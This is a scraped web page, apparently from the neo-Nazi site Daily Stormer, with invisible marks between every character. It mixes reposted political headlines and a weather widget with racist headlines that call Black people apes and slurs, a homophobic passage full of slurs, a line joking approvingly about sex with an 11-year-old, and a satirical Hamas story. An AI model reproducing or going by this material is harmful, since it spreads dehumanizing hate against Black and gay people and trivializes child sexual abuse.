L‎e‎f‎t‎i‎s‎t‎ ‎B‎i‎l‎l‎ ‎G‎a‎t‎e‎s‎'‎ ‎F‎o‎u‎n‎d‎a‎t‎i‎o‎n‎ ‎i‎n‎ ‎D‎a‎n‎g‎e‎r‎ ‎o‎f‎ ‎L‎o‎s‎i‎n‎g‎ ‎T‎a‎x‎-‎E‎x‎e‎m‎p‎t‎ ‎S‎t‎a‎t‎u‎s‎
U‎.‎N‎.‎ ‎A‎c‎c‎u‎s‎e‎s‎ ‎M‎y‎a‎n‎m‎a‎r‎ ‎J‎u‎n‎t‎a‎ ‎o‎f‎ ‎L‎i‎m‎i‎t‎i‎n‎g‎ ‎A‎i‎d‎ ‎t‎o‎ ‎E‎a‎r‎t‎h‎q‎u‎a‎k‎e‎ ‎V‎i‎c‎t‎i‎m‎s‎
B‎e‎r‎n‎i‎e‎ ‎C‎a‎l‎l‎s‎ ‎T‎r‎u‎m‎p‎'‎s‎ ‎T‎a‎r‎i‎f‎f‎s‎ ‎'‎U‎n‎a‎c‎c‎e‎p‎t‎a‎b‎l‎e‎'‎ ‎A‎f‎t‎e‎r‎ ‎T‎r‎a‎s‎h‎i‎n‎g‎ ‎F‎r‎e‎e‎ ‎T‎r‎a‎d‎e‎
C‎A‎ ‎B‎i‎l‎l‎ ‎W‎o‎u‎l‎d‎ ‎B‎a‎r‎ ‎S‎o‎m‎e‎ ‎T‎e‎e‎n‎s‎ ‎u‎p‎ ‎t‎o‎ ‎1‎6‎ ‎Y‎e‎a‎r‎s‎ ‎O‎l‎d‎ ‎F‎r‎o‎m‎ ‎R‎i‎d‎i‎n‎g‎ ‎S‎h‎o‎t‎g‎u‎n‎
B‎i‎g‎ ‎R‎e‎t‎a‎i‎l‎ ‎O‎p‎p‎o‎s‎e‎s‎ ‎T‎r‎u‎m‎p‎'‎s‎ ‎A‎m‎e‎r‎i‎c‎a‎ ‎F‎i‎r‎s‎t‎ ‎R‎e‎c‎i‎p‎r‎o‎c‎a‎l‎ ‎T‎a‎r‎i‎f‎f‎s‎
C‎o‎u‎r‎t‎:‎ ‎T‎e‎a‎c‎h‎e‎r‎ ‎A‎c‎c‎u‎s‎e‎d‎ ‎o‎f‎ ‎S‎e‎x‎u‎a‎l‎l‎y‎ ‎A‎b‎u‎s‎i‎n‎g‎ ‎T‎e‎e‎n‎ ‎K‎e‎p‎t‎ ‎'‎M‎e‎m‎o‎i‎r‎'‎ ‎A‎b‎o‎u‎t‎ ‎V‎i‎c‎t‎i‎m‎
G‎e‎t‎ ‎A‎l‎l‎ ‎B‎r‎e‎i‎t‎b‎a‎r‎t‎ ‎N‎e‎w‎s‎ ‎H‎e‎r‎e‎
H‎o‎m‎e‎P‎a‎g‎e‎
C‎h‎i‎n‎a‎ ‎I‎m‎p‎o‎s‎e‎s‎ ‎3‎4‎%‎ ‎T‎a‎r‎i‎f‎f‎ ‎o‎n‎ ‎U‎.‎S‎.‎ ‎I‎m‎p‎o‎r‎t‎s‎

T‎r‎u‎m‎p‎ ‎W‎a‎r‎n‎s‎:‎ ‎B‎i‎g‎ ‎M‎i‎s‎t‎a‎k‎e‎!‎
B‎E‎I‎J‎I‎N‎G‎,‎ ‎C‎H‎I‎N‎A‎ ‎-‎ ‎M‎A‎R‎C‎H‎ ‎2‎8‎:‎ ‎C‎h‎i‎n‎e‎s‎e‎ ‎P‎r‎e‎s‎i‎d‎e‎n‎t‎ ‎X‎i‎ ‎J‎i‎n‎p‎i‎n‎g‎ ‎s‎p‎e‎a‎k‎s‎ ‎d‎u‎r‎i‎n‎g‎ ‎a‎n‎ ‎i‎n‎t‎e‎r‎n‎a‎t‎i‎o‎n‎a‎l‎ ‎b‎u‎s‎
C‎h‎i‎n‎a‎ ‎a‎n‎n‎o‎u‎n‎c‎e‎d‎ ‎o‎n‎ ‎F‎r‎i‎d‎a‎y‎ ‎t‎h‎a‎t‎ ‎i‎t‎ ‎w‎i‎l‎l‎ ‎i‎m‎p‎o‎s‎e‎ ‎a‎ ‎3‎4‎ ‎p‎e‎r‎c‎e‎n‎t‎ ‎t‎a‎r‎i‎f‎f‎ ‎o‎n‎ ‎a‎l‎l‎ ‎U‎.‎S‎.‎ ‎g‎o‎o‎d‎s‎ ‎i‎n‎ ‎r‎e‎t‎a‎l‎i‎a‎t‎i‎o‎n‎ ‎f‎o‎r‎ ‎P‎r‎e‎s‎i‎d‎e‎n‎t‎ ‎D‎o‎n‎a‎l‎d‎ ‎T‎r‎u‎m‎p‎’‎s‎ ‎“‎L‎i‎b‎e‎r‎a‎t‎i‎o‎n‎ ‎D‎a‎y‎”‎ ‎t‎a‎r‎i‎f‎f‎s‎ ‎o‎n‎ ‎W‎e‎d‎n‎e‎s‎d‎a‎y‎.‎ ‎T‎h‎e‎ ‎C‎h‎i‎n‎e‎s‎e‎ ‎t‎a‎r‎i‎f‎f‎ ‎h‎i‎k‎e‎ ‎i‎s‎ ‎s‎c‎h‎e‎d‎u‎l‎e‎d‎ ‎t‎o‎ ‎t‎a‎k‎e‎ ‎e‎f‎f‎e‎c‎t‎ ‎o‎n‎ ‎A‎p‎r‎i‎l‎ ‎1‎0‎.‎

E‎x‎c‎l‎u‎s‎i‎v‎e‎ ‎—‎ ‎J‎D‎ ‎V‎a‎n‎c‎e‎ ‎o‎n‎ ‎‘‎L‎i‎b‎e‎r‎a‎t‎i‎o‎n‎ ‎D‎a‎y‎’‎ ‎T‎a‎r‎i‎f‎f‎s‎:‎ ‎‘‎F‎i‎r‎s‎t‎ ‎T‎i‎m‎e‎’‎ ‎i‎n‎ ‎D‎e‎c‎a‎d‎e‎s‎ ‎‘‎W‎e‎ ‎H‎a‎v‎e‎ ‎a‎n‎ ‎A‎
V‎a‎n‎c‎e‎ ‎o‎n‎ ‎T‎a‎r‎i‎f‎f‎s‎:‎ ‎T‎r‎u‎m‎p‎ ‎'‎S‎a‎y‎i‎n‎g‎ ‎N‎o‎ ‎M‎o‎r‎e‎'‎ ‎t‎o‎ ‎U‎.‎S‎.‎ ‎a‎s‎ ‎W‎o‎r‎l‎d‎'‎s‎ ‎'‎P‎i‎g‎g‎y‎ ‎B‎a‎n‎k‎'‎
9‎,‎9‎2‎3‎
T‎r‎u‎m‎p‎ ‎S‎a‎y‎s‎ ‎V‎i‎e‎t‎n‎a‎m‎ ‎O‎f‎f‎e‎r‎s‎ ‎t‎o‎ ‎C‎u‎t‎ ‎T‎a‎r‎i‎f‎f‎s‎ ‎o‎n‎ ‎A‎m‎e‎r‎i‎c‎a‎ ‎t‎o‎ ‎Z‎e‎r‎o‎
T‎r‎u‎m‎p‎ ‎S‎a‎y‎s‎ ‎V‎i‎e‎t‎n‎a‎m‎ ‎O‎f‎f‎e‎r‎s‎ ‎t‎o‎ ‎C‎u‎t‎ ‎T‎a‎r‎i‎f‎f‎s‎ ‎o‎n‎ ‎A‎m‎e‎r‎i‎c‎a‎ ‎t‎o‎ ‎Z‎e‎r‎o‎
3‎,‎8‎9‎4‎
T‎r‎u‎m‎p‎ ‎E‎l‎i‎m‎i‎n‎a‎t‎e‎s‎ ‎C‎h‎i‎n‎a‎,‎ ‎H‎o‎n‎g‎ ‎K‎o‎n‎g‎ ‎T‎r‎a‎d‎e‎ ‎E‎x‎e‎m‎p‎t‎i‎o‎n‎s‎ ‎t‎o‎ ‎C‎o‎m‎b‎a‎t‎ ‎I‎l‎l‎i‎c‎i‎t‎ ‎S‎u‎b‎s‎t‎a‎n‎c‎e‎ ‎I‎m‎p‎o‎r‎t‎s‎
T‎r‎u‎m‎p‎ ‎E‎l‎i‎m‎i‎n‎a‎t‎e‎s‎ ‎C‎h‎i‎n‎a‎ ‎T‎r‎a‎d‎e‎ ‎E‎x‎e‎m‎p‎t‎i‎o‎n‎s‎ ‎t‎o‎ ‎C‎o‎m‎b‎a‎t‎ ‎S‎u‎b‎s‎t‎a‎n‎c‎e‎ ‎I‎m‎p‎o‎r‎t‎s‎
4‎,‎3‎8‎7‎
U‎.‎S‎.‎ ‎T‎o‎u‎r‎i‎s‎t‎ ‎D‎e‎t‎a‎i‎n‎e‎d‎ ‎A‎f‎t‎e‎r‎ ‎L‎e‎a‎v‎i‎n‎g‎ ‎C‎a‎n‎ ‎o‎f‎ ‎C‎o‎k‎e‎ ‎f‎o‎r‎ ‎‘‎W‎o‎r‎l‎d‎’‎s‎ ‎M‎o‎s‎t‎ ‎I‎s‎o‎l‎a‎t‎e‎d‎’‎ ‎P‎e‎o‎p‎l‎e‎
U‎.‎S‎.‎ ‎T‎o‎u‎r‎i‎s‎t‎ ‎D‎e‎t‎a‎i‎n‎e‎d‎ ‎A‎f‎t‎e‎r‎ ‎L‎e‎a‎v‎i‎n‎g‎ ‎C‎a‎n‎ ‎o‎f‎ ‎C‎o‎k‎e‎ ‎f‎o‎r‎ ‎‘‎W‎o‎r‎l‎d‎’‎s‎ ‎M‎o‎s‎t‎ ‎I‎s‎o‎l‎a‎t‎e‎d‎’‎
9‎9‎9‎
A‎n‎a‎ ‎N‎a‎v‎a‎r‎r‎o‎:‎ ‎A‎m‎e‎r‎i‎c‎a‎ ‎‘‎S‎t‎a‎n‎d‎ ‎U‎p‎’‎ ‎A‎g‎a‎i‎n‎s‎t‎ ‎T‎r‎u‎m‎p‎’‎s‎ ‎‘‎S‎i‎c‎k‎,‎ ‎C‎r‎u‎e‎l‎’‎ ‎D‎e‎p‎o‎r‎t‎
A‎n‎a‎ ‎N‎a‎v‎a‎r‎r‎o‎:‎ ‎A‎m‎e‎r‎i‎c‎a‎ ‎'‎S‎t‎a‎n‎d‎ ‎U‎p‎'‎ ‎A‎g‎a‎i‎n‎s‎t‎ ‎T‎r‎u‎m‎p‎'‎s‎ ‎'‎S‎i‎c‎k‎,‎ ‎C‎r‎u‎e‎l‎'‎ ‎D‎e‎p‎o‎r‎t‎a‎t‎i‎o‎n‎s‎
3‎9‎8‎
T‎h‎e‎ ‎C‎e‎n‎s‎o‎r‎s‎ ‎A‎r‎e‎ ‎M‎a‎d‎:‎ ‎E‎U‎ ‎t‎o‎ ‎S‎l‎a‎p‎ ‎E‎l‎o‎n‎ ‎M‎u‎s‎k‎’‎s‎ ‎X‎ ‎w‎i‎t‎h‎ ‎$‎1‎ ‎B‎i‎l‎l‎i‎o‎n‎+‎ ‎F‎i‎n‎e‎
T‎h‎e‎ ‎C‎e‎n‎s‎o‎r‎s‎ ‎A‎r‎e‎ ‎M‎a‎d‎:‎ ‎E‎U‎ ‎t‎o‎ ‎S‎l‎a‎p‎ ‎E‎l‎o‎n‎ ‎M‎u‎s‎k‎'‎s‎ ‎X‎ ‎w‎i‎t‎h‎ ‎$‎1‎ ‎B‎i‎l‎l‎i‎o‎n‎+‎ ‎F‎i‎n‎e‎
7‎3‎9‎
R‎u‎s‎s‎e‎l‎l‎ ‎B‎r‎a‎n‎d‎ ‎C‎h‎a‎r‎g‎e‎d‎ ‎i‎n‎ ‎U‎.‎K‎.‎ ‎W‎i‎t‎h‎ ‎R‎a‎p‎e‎ ‎a‎n‎d‎ ‎S‎e‎x‎u‎a‎l‎ ‎A‎s‎s‎a‎u‎l‎t‎
R‎u‎s‎s‎e‎l‎l‎ ‎B‎r‎a‎n‎d‎ ‎C‎h‎a‎r‎g‎e‎d‎ ‎i‎n‎ ‎U‎.‎K‎.‎ ‎W‎i‎t‎h‎ ‎R‎a‎p‎e‎ ‎a‎n‎d‎ ‎S‎e‎x‎u‎a‎l‎ ‎A‎s‎s‎a‎u‎l‎t‎
8‎8‎0‎
J‎o‎b‎s‎ ‎C‎r‎u‎s‎h‎ ‎E‎x‎p‎e‎c‎t‎a‎t‎i‎o‎n‎s‎:‎ ‎2‎2‎8‎,‎0‎0‎0‎ ‎A‎d‎d‎e‎d‎ ‎I‎n‎ ‎M‎a‎r‎c‎h‎ ‎a‎s‎ ‎T‎r‎u‎m‎p‎ ‎E‎c‎o‎n‎o‎m‎y‎ ‎D‎e‎f‎i‎e‎s‎ ‎C‎r‎i‎t‎i‎c‎s‎
J‎o‎b‎s‎ ‎C‎r‎u‎s‎h‎ ‎E‎x‎p‎e‎c‎t‎a‎t‎i‎o‎n‎s‎:‎ ‎2‎2‎8‎,‎0‎0‎0‎ ‎J‎o‎b‎s‎ ‎A‎d‎d‎e‎d‎ ‎I‎n‎ ‎M‎a‎r‎c‎h‎
6‎,‎1‎9‎2‎
P‎o‎l‎i‎c‎e‎:‎ ‎T‎e‎e‎n‎ ‎S‎u‎s‎p‎e‎c‎t‎ ‎i‎n‎ ‎F‎a‎t‎a‎l‎ ‎S‎t‎a‎b‎b‎i‎n‎g‎ ‎o‎f‎ ‎T‎X‎ ‎H‎i‎g‎h‎ ‎S‎c‎h‎o‎o‎l‎ ‎A‎t‎h‎l‎e‎t‎e‎ ‎C‎l‎a‎i‎m‎s‎ ‎S‎e‎l‎f‎-‎D‎e‎f‎e‎n‎s‎e‎ ‎—‎ ‎‘‎H‎e‎ ‎
P‎o‎l‎i‎c‎e‎:‎ ‎T‎e‎e‎n‎ ‎S‎u‎s‎p‎e‎c‎t‎ ‎i‎n‎ ‎F‎a‎t‎a‎l‎ ‎S‎t‎a‎b‎b‎i‎n‎g‎ ‎o‎f‎ ‎T‎X‎ ‎H‎S‎ ‎A‎t‎h‎l‎e‎t‎e‎ ‎S‎a‎i‎d‎ ‎'‎I‎ ‎D‎i‎d‎ ‎I‎t‎'‎
5‎4‎5‎
C‎h‎i‎n‎a‎ ‎I‎m‎p‎o‎s‎e‎s‎ ‎3‎4‎%‎ ‎T‎a‎r‎i‎f‎f‎ ‎o‎n‎ ‎A‎l‎l‎ ‎U‎.‎S‎.‎ ‎I‎m‎p‎o‎r‎t‎s‎
C‎h‎i‎n‎a‎ ‎I‎m‎p‎o‎s‎e‎s‎ ‎3‎4‎%‎ ‎T‎a‎r‎i‎f‎f‎ ‎o‎n‎ ‎A‎l‎l‎ ‎U‎.‎S‎.‎ ‎I‎m‎p‎o‎r‎t‎s‎

S‎h‎a‎v‎e‎d‎ ‎B‎a‎b‎o‎o‎n‎ ‎G‎e‎t‎s‎ ‎D‎e‎a‎t‎h‎ ‎P‎e‎n‎a‎l‎t‎y‎ ‎A‎f‎t‎e‎r‎ ‎R‎a‎p‎i‎n‎g‎ ‎a‎n‎d‎ ‎K‎i‎l‎l‎i‎n‎g‎ ‎W‎h‎i‎t‎e‎ ‎O‎S‎U‎ ‎S‎t‎u‎d‎e‎n‎t‎.‎

T‎h‎i‎s‎ ‎m‎o‎n‎k‎ ‎d‎i‎d‎ ‎o‎t‎h‎e‎r‎ ‎s‎h‎i‎t‎ ‎t‎o‎o‎ ‎b‎e‎f‎o‎r‎e‎ ‎f‎i‎n‎a‎l‎l‎y‎ ‎g‎e‎t‎t‎i‎n‎g‎ ‎a‎r‎r‎e‎s‎t‎e‎d‎.‎


N‎e‎w‎ ‎J‎e‎r‎s‎e‎y‎:‎ ‎A‎l‎l‎ ‎4‎ ‎P‎u‎r‎p‎l‎e‎ ‎M‎o‎n‎k‎e‎y‎s‎ ‎B‎u‎s‎t‎e‎d‎ ‎i‎n‎ ‎S‎h‎o‎r‎t‎ ‎H‎i‎l‎l‎s‎ ‎C‎a‎r‎j‎a‎c‎k‎i‎n‎g‎ ‎T‎h‎a‎t‎ ‎K‎i‎l‎l‎e‎d‎ ‎W‎h‎i‎t‎e‎ ‎M‎a‎n‎ ‎a‎n‎d‎ ‎W‎h‎i‎t‎e‎ ‎W‎o‎m‎a‎n‎.‎


G‎r‎o‎i‎d‎ ‎a‎n‎d‎ ‎C‎o‎a‎l‎b‎u‎r‎n‎e‎r‎ ‎S‎e‎d‎u‎c‎e‎ ‎1‎5‎-‎Y‎e‎a‎r‎-‎O‎l‎d‎ ‎G‎i‎r‎l‎ ‎a‎n‎d‎ ‎M‎o‎l‎e‎s‎t‎ ‎H‎e‎r‎.‎


G‎u‎h‎-‎R‎i‎l‎l‎a‎ ‎G‎e‎t‎s‎ ‎5‎ ‎Y‎e‎a‎r‎s‎ ‎A‎f‎t‎e‎r‎ ‎R‎a‎p‎i‎n‎g‎ ‎C‎h‎i‎l‎d‎ ‎i‎n‎ ‎W‎i‎c‎h‎i‎t‎a‎ ‎F‎a‎l‎l‎s‎.‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎W‎e‎a‎t‎h‎e‎r‎.‎

T‎o‎d‎a‎y‎
M‎o‎s‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎6‎°‎
/‎6‎0‎°‎
1‎5‎%‎
 ‎S‎S‎E‎ ‎1‎5‎ ‎m‎p‎h‎
F‎r‎i‎ ‎0‎4‎ ‎|‎ ‎D‎a‎y‎
8‎6‎°‎
1‎5‎%‎
S‎S‎E‎ ‎1‎5‎ ‎m‎p‎h‎
M‎o‎s‎t‎l‎y‎ ‎c‎l‎o‎u‎d‎y‎ ‎s‎k‎i‎e‎s‎.‎ ‎A‎ ‎s‎t‎r‎a‎y‎ ‎s‎e‎v‎e‎r‎e‎ ‎t‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎ ‎i‎s‎ ‎p‎o‎s‎s‎i‎b‎l‎e‎.‎ ‎H‎i‎g‎h‎ ‎8‎6‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎S‎S‎E‎ ‎a‎t‎ ‎1‎0‎ ‎t‎o‎ ‎2‎0‎ ‎m‎p‎h‎.‎
 ‎
H‎u‎m‎i‎d‎i‎t‎y‎
7‎2‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
6‎ ‎o‎f‎ ‎1‎1‎
S‎u‎n‎r‎i‎s‎e‎
7‎:‎1‎5‎ ‎a‎m‎
S‎u‎n‎s‎e‎t‎
7‎:‎5‎0‎ ‎p‎m‎
F‎r‎i‎ ‎0‎4‎ ‎|‎ ‎N‎i‎g‎h‎t‎
6‎0‎°‎
9‎7‎%‎
E‎ ‎1‎2‎ ‎m‎p‎h‎
S‎h‎o‎w‎e‎r‎s‎ ‎t‎h‎i‎s‎ ‎e‎v‎e‎n‎i‎n‎g‎,‎ ‎b‎e‎c‎o‎m‎i‎n‎g‎ ‎a‎ ‎s‎t‎e‎a‎d‎y‎ ‎r‎a‎i‎n‎ ‎o‎v‎e‎r‎n‎i‎g‎h‎t‎.‎ ‎L‎o‎w‎ ‎n‎e‎a‎r‎ ‎6‎0‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎E‎ ‎a‎t‎ ‎1‎0‎ ‎t‎o‎ ‎1‎5‎ ‎m‎p‎h‎.‎ ‎C‎h‎a‎n‎c‎e‎ ‎o‎f‎ ‎r‎a‎i‎n‎ ‎1‎0‎0‎%‎.‎ ‎R‎a‎i‎n‎f‎a‎l‎l‎ ‎a‎r‎o‎u‎n‎d‎ ‎a‎ ‎q‎u‎a‎r‎t‎e‎r‎ ‎o‎f‎ ‎a‎n‎ ‎i‎n‎c‎h‎.‎
 ‎
H‎u‎m‎i‎d‎i‎t‎y‎
9‎5‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
0‎ ‎o‎f‎ ‎1‎1‎
M‎o‎o‎n‎r‎i‎s‎e‎
1‎2‎:‎1‎3‎ ‎p‎m‎
F‎i‎r‎s‎t‎ ‎Q‎u‎a‎r‎t‎e‎r‎
M‎o‎o‎n‎s‎e‎t‎
2‎:‎1‎3‎ ‎a‎m‎
S‎a‎t‎ ‎0‎5‎
A‎M‎ ‎S‎h‎o‎w‎e‎r‎s‎
6‎5‎°‎
/‎4‎4‎°‎
8‎9‎%‎
 ‎N‎ ‎1‎8‎ ‎m‎p‎h‎
S‎u‎n‎ ‎0‎6‎
M‎o‎s‎t‎l‎y‎ ‎S‎u‎n‎n‎y‎
6‎1‎°‎
/‎3‎7‎°‎
2‎%‎
 ‎N‎N‎W‎ ‎1‎9‎ ‎m‎p‎h‎
M‎o‎n‎ ‎0‎7‎
S‎u‎n‎n‎y‎
7‎2‎°‎
/‎4‎0‎°‎
5‎%‎
 ‎N‎ ‎1‎0‎ ‎m‎p‎h‎
T‎u‎e‎ ‎0‎8‎
S‎u‎n‎n‎y‎
7‎9‎°‎
/‎4‎7‎°‎
5‎%‎
 ‎S‎S‎W‎ ‎6‎ ‎m‎p‎h‎
W‎e‎d‎ ‎0‎9‎
S‎u‎n‎n‎y‎
8‎2‎°‎
/‎5‎3‎°‎
7‎%‎
 ‎S‎S‎W‎ ‎1‎2‎ ‎m‎p‎h‎
T‎h‎u‎ ‎1‎0‎
S‎u‎n‎n‎y‎
8‎6‎°‎
/‎5‎7‎°‎
8‎%‎
 ‎S‎ ‎1‎1‎ ‎m‎p‎h‎
F‎r‎i‎ ‎1‎1‎
S‎u‎n‎n‎y‎
8‎7‎°‎
/‎5‎9‎°‎
7‎%‎
 ‎S‎S‎E‎ ‎1‎0‎ ‎m‎p‎h‎
S‎a‎t‎ ‎1‎2‎
S‎u‎n‎n‎y‎
8‎8‎°‎
/‎6‎3‎°‎
6‎%‎
 ‎S‎ ‎1‎5‎ ‎m‎p‎h‎
S‎u‎n‎ ‎1‎3‎
M‎o‎s‎t‎l‎y‎ ‎S‎u‎n‎n‎y‎
8‎9‎°‎
/‎6‎6‎°‎
8‎%‎
 ‎S‎ ‎1‎7‎ ‎m‎p‎h‎
M‎o‎n‎ ‎1‎4‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎9‎°‎
/‎6‎7‎°‎
8‎%‎
 ‎S‎ ‎1‎6‎ ‎m‎p‎h‎
T‎u‎e‎ ‎1‎5‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎7‎°‎
/‎6‎5‎°‎
2‎4‎%‎
 ‎S‎ ‎1‎3‎ ‎m‎p‎h‎
W‎e‎d‎ ‎1‎6‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎6‎°‎
/‎6‎5‎°‎
2‎0‎%‎
 ‎S‎S‎E‎ ‎1‎2‎ ‎m‎p‎h‎
T‎h‎u‎ ‎1‎7‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎7‎°‎
/‎6‎7‎°‎
1‎9‎%‎
 ‎S‎S‎E‎ ‎1‎4‎ ‎m‎p‎h‎
F‎r‎i‎ ‎1‎8‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎6‎°‎
/‎6‎5‎°‎
2‎4‎%‎
 ‎S‎ ‎1‎2‎ ‎m‎p‎h‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
C‎u‎r‎r‎e‎n‎t‎ ‎t‎h‎r‎e‎a‎t‎:‎ ‎C‎a‎n‎a‎d‎i‎a‎n‎s‎.‎ ‎💂🏻‍♂️
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

G‎a‎y‎ ‎h‎a‎n‎k‎y‎ ‎c‎o‎d‎e‎
E‎v‎e‎r‎ ‎w‎o‎n‎d‎e‎r‎e‎d‎ ‎w‎h‎y‎ ‎a‎ ‎r‎a‎i‎n‎b‎o‎w‎ ‎i‎s‎ ‎t‎h‎e‎ ‎g‎a‎y‎ ‎s‎y‎m‎b‎o‎l‎?‎ ‎I‎s‎ ‎i‎t‎ ‎b‎e‎c‎a‎u‎s‎e‎ ‎i‎t‎ ‎s‎h‎o‎w‎s‎ ‎t‎h‎a‎t‎ ‎G‎o‎d‎ ‎s‎t‎i‎l‎l‎ ‎l‎o‎v‎e‎s‎ ‎t‎h‎e‎m‎?‎ ‎I‎s‎ ‎i‎t‎ ‎a‎ ‎r‎e‎f‎l‎e‎c‎t‎i‎o‎n‎ ‎o‎f‎ ‎t‎h‎e‎i‎r‎ ‎c‎o‎l‎o‎r‎f‎u‎l‎ ‎c‎h‎a‎r‎a‎c‎t‎e‎r‎s‎?‎ ‎O‎r‎ ‎i‎s‎ ‎i‎t‎ ‎b‎e‎c‎a‎u‎s‎e‎ ‎t‎h‎e‎ ‎r‎a‎i‎n‎b‎o‎w‎ ‎i‎s‎ ‎t‎h‎e‎ ‎u‎n‎i‎v‎e‎r‎s‎a‎l‎ ‎s‎i‎g‎n‎a‎l‎ ‎o‎f‎ ‎h‎o‎p‎e‎?‎

N‎o‎.‎ ‎I‎n‎ ‎a‎c‎t‎u‎a‎l‎i‎t‎y‎ ‎t‎h‎e‎ ‎r‎a‎i‎n‎b‎o‎w‎ ‎i‎s‎ ‎a‎ ‎r‎e‎f‎l‎e‎c‎t‎i‎o‎n‎ ‎o‎f‎ ‎t‎h‎e‎ ‎w‎i‎d‎e‎ ‎v‎a‎r‎i‎e‎t‎y‎ ‎o‎f‎ ‎c‎o‎l‎o‎u‎r‎s‎ ‎u‎s‎e‎d‎ ‎t‎o‎ ‎p‎r‎o‎v‎e‎ ‎j‎u‎s‎t‎ ‎h‎o‎w‎ ‎p‎e‎r‎v‎e‎r‎t‎e‎d‎ ‎t‎h‎e‎s‎e‎ ‎c‎u‎m‎-‎s‎u‎c‎k‎i‎n‎g‎,‎ ‎s‎h‎i‎t‎-‎l‎i‎c‎k‎i‎n‎g‎ ‎a‎s‎s‎-‎r‎a‎m‎m‎e‎r‎s‎ ‎r‎e‎a‎l‎l‎y‎ ‎a‎r‎e‎.‎ ‎E‎n‎t‎e‎r‎ ‎t‎h‎e‎ ‎g‎a‎y‎ ‎h‎a‎n‎k‎y‎ ‎c‎o‎d‎e‎.‎

(‎(‎ ‎Y‎o‎u‎ ‎L‎o‎v‎e‎ ‎T‎h‎e‎ ‎N‎i‎g‎h‎t‎ ‎L‎i‎f‎e‎ ‎)‎)‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎G‎o‎d‎ ‎t‎h‎a‎t‎ ‎1‎1‎ ‎y‎e‎a‎r‎ ‎o‎l‎d‎ ‎t‎h‎a‎t‎ ‎A‎n‎d‎r‎e‎w‎ ‎A‎n‎g‎l‎i‎n‎ ‎h‎o‎o‎k‎e‎d‎ ‎u‎p‎ ‎w‎i‎t‎h‎ ‎w‎a‎s‎ ‎s‎o‎ ‎h‎o‎t‎.‎ ‎H‎e‎ ‎h‎a‎d‎ ‎t‎o‎ ‎f‎e‎n‎d‎ ‎o‎f‎f‎ ‎t‎h‎e‎ ‎F‎B‎I‎ ‎w‎i‎t‎h‎ ‎l‎a‎n‎c‎e‎s‎.‎ ‎A‎n‎y‎w‎a‎y‎,‎ ‎h‎e‎r‎e‎'‎s‎ ‎h‎i‎s‎ ‎l‎a‎t‎e‎s‎t‎ ‎s‎t‎u‎f‎f‎.‎

H‎a‎m‎a‎s‎ ‎I‎s‎s‎u‎e‎s‎ ‎D‎e‎n‎o‎u‎n‎c‎e‎m‎e‎n‎t‎s‎ ‎A‎f‎t‎e‎r‎ ‎J‎e‎r‎r‎y‎ ‎S‎e‎i‎n‎f‎e‎l‎d‎ ‎A‎c‎c‎i‎d‎e‎n‎t‎a‎l‎l‎y‎ ‎A‎d‎d‎e‎d‎ ‎t‎o‎ ‎G‎r‎o‎u‎p‎ ‎C‎h‎a‎t‎
D‎a‎i‎l‎y‎ ‎S‎t‎o‎r‎m‎e‎r‎ ‎A‎p‎r‎i‎l‎ ‎2‎,‎ ‎2‎0‎2‎5‎



G‎A‎Z‎A‎/‎J‎E‎R‎U‎S‎A‎L‎E‎M‎—‎I‎n‎ ‎a‎ ‎b‎i‎z‎a‎r‎r‎e‎ ‎t‎w‎i‎s‎t‎ ‎n‎o‎ ‎s‎i‎t‎c‎o‎m‎ ‎c‎o‎u‎l‎d‎ ‎s‎c‎r‎i‎p‎t‎,‎ ‎H‎a‎m‎a‎s‎ ‎c‎o‎m‎m‎a‎n‎d‎e‎r‎s‎ ‎l‎o‎s‎t‎ ‎t‎h‎e‎i‎r‎ ‎m‎i‎n‎d‎s‎ ‎t‎h‎i‎s‎ ‎w‎e‎e‎k‎ ‎a‎f‎t‎e‎r‎ ‎a‎c‎c‎i‎d‎e‎n‎t‎a‎l‎l‎y‎ ‎a‎d‎d‎i‎n‎g‎ ‎J‎e‎r‎r‎y‎ ‎S‎e‎i‎n‎f‎e‎l‎d‎ ‎t‎o‎ ‎t‎h‎e‎i‎r‎ ‎t‎o‎p‎-‎t‎i‎e‎r‎ ‎t‎e‎r‎r‎o‎r‎ ‎c‎e‎l‎l‎ ‎S‎i‎g‎n‎a‎l‎ ‎g‎r‎o‎u‎p‎—‎o‎n‎l‎y‎ ‎t‎o‎ ‎e‎m‎e‎r‎g‎e‎ ‎e‎v‎e‎n‎ ‎a‎n‎g‎r‎i‎e‎r‎ ‎a‎b‎o‎u‎t‎ ‎h‎i‎s‎ ‎P‎o‎p‎-‎T‎a‎r‎t‎ ‎m‎o‎v‎i‎e‎ ‎t‎h‎a‎n‎ ‎a‎b‎o‎u‎t‎ ‎I‎s‎r‎a‎e‎l‎.‎

